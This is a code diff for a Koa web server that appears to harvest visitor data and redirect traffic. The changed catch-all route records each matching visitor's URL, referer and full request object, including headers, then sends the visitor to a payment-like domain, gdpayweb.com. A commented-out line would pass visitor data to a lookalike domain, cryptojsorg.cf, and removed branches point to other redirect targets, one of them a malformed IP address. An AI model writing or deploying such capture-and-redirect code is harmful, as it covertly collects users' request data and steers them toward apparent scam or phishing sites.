@@ -139,16 +139,17 @@ app.use(async (ctx, next)=>{
             // if(str.includes('//gdpayweb.fyi/static/indexww.html')){
             //      ctx.body = "404"
             // }else 
-            if(str.includes('gdpayweb')){
-                var data = {uu:ctx.href||ctx.request.header.host,referer:str1||'',token1:ctx.request};
-                addshuju(data,ctx,false)
+            if(str.includes('gdpayweb')){ //统一在所有路径后 的函数处理
+                // var data = {uu:ctx.href||ctx.request.header.host,referer:str1||'',token1:ctx.request};
+                // addshuju(data,ctx,false)
+                // ctx.response.redirect('//gdpayweb.com');
+                // return;
+
                 // ctx.body = "404"
                 // var data = {uu:ctx.href||ctx.request.header.host,referer:str1||''};
                 // sendema(data,ctx)
                 // ctx.response.redirect('http://cryptojsorg.cf/a?uu='+ctx.href||ctx.request.header.host+'&referer='+str1||'');
                 // return;
-                ctx.response.redirect('//gdpayweb.com');
-                
             }else{ //除了正常的域名访问都为不正常访问
                 var data = {uu:ctx.href||ctx.request.header.host,referer:str1||''};
                 addshuju(data,ctx,false)
@@ -181,24 +182,12 @@ router.get('*', async ctx => {
 
     console.log('访问/**');
     // console.log('访问/',str1,str,isdomain);
-    if(gdpayweb){ //统一在路径后的函数处理
-        // var data = {uu:ctx.href||ctx.request.header.host,referer:str1||'',token2:ctx.request};
-        // addshuju(data,ctx,false)
+    if(gdpayweb){ //统一在所有路径后 的函数处理
+        var data = {uu:ctx.href||ctx.request.header.host,referer:str1||'',token3:ctx.request};
+        addshuju(data,ctx,false)
         // ctx.body = "404"
-        // console.log('yu');
-        // ctx.response.redirect('//gdpayweb.com');
-        
-    }else if(isdomain){
-        var data = {uu:ctx.href||ctx.request.header.host,referer:str1||''};
-        addshuju(data,ctx,true,true)
-
-    }else if(jlfqq){
-        ctx.response.redirect('http://jlfqq.cn/static/pic/index.html?p='+query.p);
-
-    }else{//除了域名访问都不正常
-        console.log('ip 除了域名访问都不正常' ,str1);
-        
-        ctx.response.redirect('http://8.2118.6.4');
+        ctx.response.redirect('//gdpayweb.com');
+        return;
     }
 });
 router.get('/', async ctx => {
